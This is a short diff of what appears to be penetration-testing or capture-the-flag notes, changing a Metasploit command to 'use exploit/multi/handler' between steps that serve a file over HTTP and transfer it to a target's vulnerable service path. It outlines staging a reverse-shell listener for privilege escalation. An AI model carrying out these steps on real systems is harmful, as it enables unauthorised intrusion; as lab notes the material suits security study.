@@ -39,7 +39,7 @@ python -m http.server 80
 msfconsole
 ```
 ```bash
-search multi/handler
+use exploit/multi/handler
 ```
 Transfer file to target machine at the vulnerable service path:
 ```powershell
